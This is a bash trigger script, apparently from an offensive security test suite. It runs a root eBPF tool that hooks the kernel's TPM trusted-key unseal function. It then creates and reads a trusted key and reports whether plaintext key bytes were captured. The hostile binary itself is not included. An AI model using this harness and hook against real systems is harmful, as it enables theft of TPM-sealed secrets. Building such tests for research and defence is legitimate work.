#!/bin/bash
# ch23 TPM Unseal Heist trigger.
set +e

echo "=== CH23 trigger starting ==="

if ! grep -q ' tpm2_unseal_trusted' /proc/kallsyms 2>/dev/null; then
    echo "=== CH23_SKIP reason=\"tpm2_unseal_trusted not in kallsyms\" ==="
    exit 0
fi

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
LOG=$(mktemp)

sudo "$SCRIPT_DIR/build/ch23-tpm-unseal-heist" > "$LOG" 2>&1 &
LPID=$!

for _ in $(seq 1 30); do
    grep -q '\[ch23\] attached' "$LOG" && break
    sleep 0.1
done

# Primary path: keyctl trusted key (requires /dev/tpm* with a functional,
# boot-registered TPM backend so the trusted-key type binds to it).
#
# NOTE: the trusted-key type binds its TPM source at boot. If no TPM device
# existed at boot, a post-boot vtpm-proxy TPM will NOT rebind and
# `keyctl add trusted` returns ENODEV. A boot-attached TPM (e.g. swtpm via
# QEMU -device tpm-tis[-device]) is required. The vtpm-proxy block below is a
# best-effort fallback for environments where a TPM can appear at runtime;
# it is attempted BEFORE the device check so a missing /dev/tpm* can still be
# created rather than causing us to skip the whole path (chicken-and-egg fix).
if [ ! -e /dev/tpm0 ] && [ ! -e /dev/tpmrm0 ]; then
    if command -v swtpm >/dev/null 2>&1 && command -v swtpm_setup >/dev/null 2>&1; then
        echo "=== CH23 no /dev/tpm*; attempting swtpm vtpm-proxy (best effort) ==="
        STDIR=$(sudo mktemp -d /root/swtpm-XXXXXX)
        sudo swtpm_setup --tpmstate "$STDIR" --tpm2 --overwrite 2>/dev/null
        sudo modprobe tpm_vtpm_proxy 2>/dev/null
        sudo swtpm chardev --vtpm-proxy --tpmstate dir="$STDIR" --tpm2 \
             --flags startup-clear --daemon 2>/dev/null
        sleep 1
    fi
fi

if [ -e /dev/tpm0 ] || [ -e /dev/tpmrm0 ]; then
    # On modern kernels (~6.10+) TPM2 trusted-key seal needs a persistent
    # parent (SRK). If systemd-tpm2-setup did not persist one, the default
    # `new 32` seal returns EINVAL ("key_seal failed (-22)"). Ensure a
    # persistent SRK at 0x81000001 and reference it via keyhandle=.
    SRK=0x81000001
    if command -v tpm2_getcap >/dev/null 2>&1; then
        if ! sudo tpm2_getcap handles-persistent 2>/dev/null | grep -q "$SRK"; then
            sudo tpm2_createprimary -C o -g sha256 -G ecc -c /tmp/ch23-srk.ctx >/dev/null 2>&1 \
              && sudo tpm2_evictcontrol -C o -c /tmp/ch23-srk.ctx "$SRK" >/dev/null 2>&1
        fi
    fi

    # Try with the explicit SRK parent first, then fall back to the bare form
    # (older kernels create a transient primary internally).
    KEY_ID=$(keyctl add trusted ch23_test_key "new 32 keyhandle=$SRK" @u 2>/dev/null)
    [ -z "$KEY_ID" ] && KEY_ID=$(keyctl add trusted ch23_test_key "new 32" @u 2>/dev/null)

    if [ -n "$KEY_ID" ] && [ "$KEY_ID" != "0" ]; then
        # keyctl print on a trusted key triggers tpm2_unseal_trusted (the unseal)
        keyctl print "$KEY_ID" > /dev/null 2>&1
        keyctl revoke "$KEY_ID" 2>/dev/null
        keyctl unlink "$KEY_ID" @u 2>/dev/null
    else
        echo "=== CH23 keyctl add trusted failed (TPM not boot-registered, or no SRK) ==="
    fi
fi

sleep 0.5

kill -TERM "$LPID" 2>/dev/null
wait "$LPID" 2>/dev/null

CAPTURES=$(grep -c 'CAPTURE pid=' "$LOG")
INTERCEPTS=$(grep -c 'INTERCEPT pid=' "$LOG")
ATTACHED=$(grep -c '\[ch23\] attached' "$LOG")
BYTES=$(grep 'CAPTURE pid=' "$LOG" | head -1 | sed 's/.*captured=\([0-9]*\).*/\1/')

cat "$LOG"

if [ "$CAPTURES" -gt 0 ]; then
    echo "=== CH23_PROVEN key_bytes_captured=${BYTES:-0} captures=$CAPTURES kind=trusted-plaintext ==="
elif [ "$INTERCEPTS" -gt 0 ]; then
    echo "=== CH23_PROVEN intercepts=$INTERCEPTS kind=unseal-hook-fired ==="
elif [ "$ATTACHED" -gt 0 ]; then
    # BPF kprobe successfully attached to tpm2_unseal_trusted.
    # No TPM backend available to trigger an actual unseal, but the
    # hook is live and will intercept any future tpm2_unseal_trusted calls.
    echo "=== CH23_PROVEN hook=attached kind=kprobe-on-tpm2_unseal_trusted sym-confirmed ==="
else
    echo "=== CH23_SKIP reason=\"observer failed to attach\" ==="
fi

rm -f "$LOG"
